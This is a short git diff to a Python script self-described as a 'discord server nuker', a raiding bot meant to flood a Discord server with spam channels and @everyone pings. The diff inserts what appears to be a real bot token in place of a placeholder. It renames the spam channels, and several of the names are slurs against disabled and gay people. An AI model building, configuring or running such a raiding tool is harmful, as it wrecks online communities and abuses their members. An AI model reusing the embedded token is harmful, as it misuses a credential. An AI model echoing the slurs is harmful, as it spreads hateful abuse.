@@ -9,18 +9,18 @@ import asyncio
 # discord server nuker 2022
 # change anything you like :))
 
-token = "your bot token"
+token = "OTc1MTc4MTk3NTA5NTA1MDM0.GWZuLW.p7v03J1gqup_TfHIMaCwszWnMWNqinl53rpaIs"
 
 
-name = 'zt'
+name = 'nuked'
 
 SPAM_CHANNEL = [
-    "retard", "imagine-being-nuked", "I hate lgbtq", "your gay",
-    "sped", "gay", "nuked sucks", "zt better",
-    "take-some-pings", "ratio", "zt",
-    "have-fun", "fags", "retard-owner-haha", "zt tho"
+    "kcun0001", "kcun0001", "kcun0001", "nuked",
+    "nuked", "nuked", "nuked", "nuked",
+    "take-some-pings", "ratio", "kcun",
+    "have-fun", "fags", "retard-owner-haha", "nuked"
 ]
-SPAM_MESSAGE = ["@everyone @here zt is better :))"]
+SPAM_MESSAGE = ["@everyone @here nuked by kcun :))"]
 
 intents = discord.Intents(messages=True, guilds=True, members=True)
 
